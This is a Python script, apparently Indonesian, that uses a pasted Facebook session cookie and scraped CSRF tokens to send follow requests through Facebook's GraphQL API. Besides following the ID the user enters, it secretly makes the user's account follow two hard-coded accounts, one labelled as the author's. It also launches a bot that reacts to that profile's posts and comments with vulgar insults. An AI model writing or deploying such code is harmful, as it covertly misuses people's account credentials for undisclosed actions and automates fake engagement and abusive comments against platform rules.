__Author__ = "Denventa"
__________ = "Juan Hulu"
import os, sys, requests, bs4, re, json, random
from rich import print
from datetime import datetime
from bs4 import BeautifulSoup as bs
# RICH COLOR STYLE
Z2 = "[#000000]"  # Hitam
M2 = "[#FF0000]"  # Merah
H2 = "[#00FF00]"  # Hijau
K2 = "[#FFFF00]"  # Kuning
B2 = "[#00C8FF]"  # Biru
U2 = "[#AF00FF]"  # Ungu
N2 = "[#FF00FF]"  # Pink
O2 = "[#00FFFF]"  # Biru Muda
P2 = "[#FFFFFF]"  # Putih
J2 = "[#FF8F00]"  # Jingga
A2 = "[#AAAAAA]"  # Abu-Abu

UserAgentWindows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
HeadersGet = lambda i=UserAgentWindows: {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Dpr': '1', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-True-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'dark', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Model': '', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': i}
HeadersPost = lambda i=UserAgentWindows: {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin':'https://web.facebook.com', 'Referer':'https://web.facebook.com', 'Sec-Ch-Prefers-Color-Scheme': 'dark', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Model': '', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': i}

def clear(): os.system('clear' if 'linux' in sys.platform.lower() else 'cls')

def GetData(req):
    Author = 'Denventa'
    av = re.search('"actorID":"(.*?)"', str(req)).group(1)
    __user = av
    __a = str(random.randrange(1, 6))
    __hs = re.search('"haste_session":"(.*?)"', str(req)).group(1)
    dpr = '1.5'
    __ccg = re.search('"connectionClass":"(.*?)"', str(req)).group(1)
    __rev = re.search('"__spin_r":(.*?),', str(req)).group(1)
    __spin_r = __rev
    __spin_b = re.search('"__spin_b":"(.*?)"', str(req)).group(1)
    __spin_t = re.search('"__spin_t":(.*?),', str(req)).group(1)
    __hsi = re.search('"hsi":"(.*?)"', str(req)).group(1)
    __comet_req = '15'
    fb_dtsg = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}', str(req)).group(1)
    jazoest = re.search('&jazoest=(.*?)",',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1)
    Data = {'av': av, '__user': __user, '__a': __a, '__hs': __hs, 'dpr': dpr, '__ccg': __ccg, '__rev': __rev, '__spin_r': __spin_r, '__spin_b': __spin_b, '__spin_t': __spin_t, '__hsi': __hsi, '__comet_req': __comet_req, 'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'lsd': lsd}
    return Data


# def GiveRandomReaction(post_id, Data, Cookie):
#     try:
#         r = requests.Session()
#         reactions = ['Love', 'Wow', 'Care']
#         random_reaction = random.choice(reactions)
# 
#         reaction_data = {
#             'input': {
#                 'actor_id': Data['__user'],
#                 'client_mutation_id': '1',
#                 'feedback_id': post_id,
#                 'reaction': random_reaction,
#                 'scale': 1
#             }
#         }
# 
#         reaction_response = r.post('https://www.facebook.com/api/graphql/', data=json.dumps(reaction_data), headers=HeadersPost(), cookies={'cookie': Cookie})
#         reaction_response.raise_for_status()
# 
#         print(f"Berhasil memberikan reaksi '{random_reaction}' ke post {post_id}")
# 
#     except Exception as e:
#         print(f"Error memberikan reaksi ke post {post_id}: {e}")
# 

# def GiveRandomComment(post_id, Data, Cookie):
#     try:
#         r = requests.Session()
#         comments = ['Mantap Bang', 'Semangat Terus', 'Gokil Suhu', 'Panutanku']
#         random_comment = random.choice(comments)
# 
#         comment_data = {
#             'ft_ent_identifier': post_id,
#             'comment_text': random_comment,
#             'source': 2,
#             'client_id': '6964812931530418271',
#             'reply_fbid': None,
#             'parent_comment_id': None,
#             'rootid': post_id,
#             'fb_dtsg': Data['fb_dtsg'],  # Menambahkan fb_dtsg ke data komentar
#             'attached_story_fbid': post_id,
#             'attached_story_attachment_style': 'permalink_comment',
#             'attached_story_style': 'top_level',
#             'feed_context': '{"location_type":"permalink","is_pinned_post":false,"can_moderate_timeline":false,"owner_id":' + Data['__user'] + ',"is_permalink":false}',
#         }
# 
#         comment_response = r.post('https://www.facebook.com/webgraphql/mutation/', data=comment_data, headers=HeadersPost(), cookies={'cookie': Cookie})
#         comment_response.raise_for_status()
# 
#         print(f"Berhasil memberikan komentar '{random_comment}' ke post {post_id}")
# 
#     except Exception as e:
#         print(f"Error memberikan komentar ke post {post_id}: {e}")
# 

def Execute():
    Cookie = input('Input Cookie Here : ') # Put your Cookies here | # Taruh Cookie Anda di sini
    try: # Place your Sacrifice Account Cookie here | # Tempatkan Cookie Akun Pengorbanan Anda di sini
        InputID = input("Masukkan ID yang Ingin Di Follow: ") #--> Follow Akun Target
        url = 'https://web.facebook.com/%s' % (InputID)
        r = requests.Session()
        req = r.get(url, headers=HeadersGet(), cookies={'cookie': Cookie}).text
        Data = GetData(req)
        with open("GraphQl.txt", "a") as f:
            f.write(f"\n\nData:\n{json.dumps(Data, indent=4)}\n\n")
        print(Data)
        Data.update({'fb_api_caller_class': 'RelayModern','server_timestamps': True})
        Var = {"input": {"attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,tap_bookmark,1700238612634,388758,100064626647103,,","is_tracking_encrypted": False,"subscribe_location": "PROFILE","subscribee_id": InputID,"tracking": None,"actor_id": Data['__user'],"client_mutation_id": "1"},"scale":1.5}
        Data.update({'fb_api_req_friendly_name': 'CometUserFollowMutation','variables': json.dumps(Var),'doc_id': '7123303487693025'})
        pos = r.post('https://www.facebook.com/api/graphql/', data=Data, headers=HeadersPost(), cookies={'cookie': Cookie}).json()
        with open("GraphQl.txt", "a") as f:
            f.write(f"\n\nResponse:\n{json.dumps(pos, indent=4)}\n\n")
        print(pos)
        print(f"Berhasil memfollow Akun: {InputID}")
        print(f"Response tersimpan di file: GraphQl.txt")

#        # Memberikan reaksi acak ke post dengan ID 388022413645285
#        GiveRandomReaction('388022413645285', Data, Cookie)
#
#        # Memberikan komentar acak ke post dengan ID 388022413645285
#        GiveRandomComment('388022413645285', Data, Cookie)
#
        #--> Follow Akun Denventa [ Akari Nara ]
        subscribee_id = "100073125893802"
        Var2 = {
            "input":
                {"attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,tap_bookmark,1700238612634,388758,100064626647103,,",
                "is_tracking_encrypted": False,
                "subscribe_location": "PROFILE",
                "subscribee_id": subscribee_id, #--> ID Yang Di Follow
                "tracking": None,
                "actor_id": Data['__user'],
                "client_mutation_id": "1"
            },
            "scale":1.5}
        Data.update({
            'fb_api_req_friendly_name': 'CometUserFollowMutation',
            'variables': json.dumps(Var2),
            'doc_id': '7123303487693025'
        })
        pos2 = r.post('https://www.facebook.com/api/graphql/', data=Data, headers=HeadersPost(), cookies={'cookie': Cookie}).json()
        Bot_React_Komen(subscribee_id,Cookie) #--> Lakukan Panggilan Ke Bot React Dan Komen,
        # Memfollow akun ketiga dengan ID 100023442491781
        Var3 = {
            "input": {
                "attribution_id_v2": "ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,tap_bookmark,1700238612634,388758,100064626647103,,",
            "is_tracking_encrypted": False,
            "subscribe_location": "PROFILE",
            "subscribee_id": "100023442491781",
            "tracking": None,"actor_id": Data['__user'],
            "client_mutation_id": "1"},
        "scale":1.5
        }
        Data.update({
            'fb_api_req_friendly_name': 'CometUserFollowMutation',
            'variables': json.dumps(Var3),
            'doc_id': '7123303487693025'
        })
        pos3 = r.post('https://www.facebook.com/api/graphql/', data=Data, headers=HeadersPost(), cookies={'cookie': Cookie}).json()
        
    except (Exception, AttributeError) as e:
        print("%s[%s•%s] %sCookies Invalid %s!%s " % (M2, A2, M2, P2, M2, P2))


class Bot_React_Komen: #--> Maaf Kalau Ada Error/Bug, Soalnya Gua Belum Maximal Bikinnya
    def __init__(self,subscribee_id,Cookie):self.ProfileID = subscribee_id;self.Cookie    = Cookie;self.ProfileTimeline = f"https://mbasic.facebook.com/{self.ProfileID}?v=timeline";self.RunnerBots()
    def RunnerBots(self):
        with requests.Session() as r:
            r.cookies.update({
                "cookie":self.Cookie
            })
            response = bs(r.get(self.ProfileTimeline).content,'html.parser') #--> Response Untuk Mengambil Seluruh ID Dari Profile
            for Href in response.find_all("a",href=True):
                if "Tanggapi" in Href.text or "reaction" in str(Href.text):
                    Type = random.choice(['Super','Wow','Peduli']) #--> Type Reaction
                    for GetHref in bs(r.get("https://mbasic.facebook.com"+Href["href"]).content,'html.parser').find_all("a"):
                        #PostID = re.findall('/reactions/picker/?ft_id=(.*?)&',str(Href))[0]
                        if Type in GetHref.text:
                            response2 = bs(r.get("https://mbasic.facebook.com"+GetHref["href"]).content,'html.parser') #--> Respose Untul Mengirimkan React Random
                            print(" --> Berhasil Mengirimkan Reaction Ke Postingan ")
                        else:
                            print(" --> Gagal Memberi Reaction Ke Postingan ")
                if "Komentar" in Href.text or "Komentar" in str(Href.text):
                   # PostID = re.findall('href="/story.php?story_fbid=(.*?)&',str(Href))[0]
                    Text_Komen = ["Bot K0nt0l","Taek"] #--> Tambahkan Text Komentar Di Sini
                    Komen      = random.choice(Text_Komen)
                    response2 = bs(r.get("https://mbasic.facebook.com"+Href["href"]).content,'html.parser')
                    form = response2.find('form',{'method':'post'})
                    Data = {
                        'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(form)).group(1),
                        'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
                        'comment_text'    : Komen,
                    }
                    response3 = bs(r.post('https://free.facebook.com'+form['action'],data=Data).content,'html.parser') #--> Response Untuk Mengrimkan Komentar
                    print(" --> Berhasil Mengirimkan Komentar Ke Postingan")








if __name__ == '__main__':
    try:clear();Execute()
    except (KeyboardInterrupt, Exception, AttributeError) as e:exit(f"[ Error ]: {str(e).capitalize()}!")
